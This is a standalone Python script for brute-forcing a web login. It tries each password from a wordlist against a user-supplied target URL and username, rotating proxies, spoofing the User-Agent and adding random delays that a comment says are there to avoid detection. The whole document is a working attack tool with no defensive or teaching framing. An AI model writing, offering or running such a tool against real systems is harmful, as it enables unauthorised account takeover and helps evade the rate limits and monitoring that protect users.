import requests
import random
import time
from requests.exceptions import RequestException
from itertools import cycle

# Define the list of proxies
proxies = ["http://proxy1.com", "http://proxy2.com", "http://proxy3.com"]  # Replace with real proxies

def brute_force_login(target, username, wordlist_file):
    proxy_pool = cycle(proxies)  # Rotate proxies
    with open(wordlist_file, 'r') as f:
        for password in f.readlines():
            password = password.strip()
            proxy = next(proxy_pool)
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
            try:
                response = requests.post(
                    target,
                    data={"username": username, "password": password},
                    proxies={"http": proxy, "https": proxy},
                    headers=headers,
                    timeout=5
                )
                if "success" in response.text.lower():
                    print(f"Password found: {password}")
                    break
                time.sleep(random.uniform(1, 2))  # Rate-limiting to avoid detection
            except RequestException as e:
                print(f"Request failed: {e}")
                continue

if __name__ == "__main__":
    target = input("Enter the target URL: ")
    username = input("Enter the username: ")
    wordlist_file = input("Enter the path to the wordlist: ")
    brute_force_login(target, username, wordlist_file)
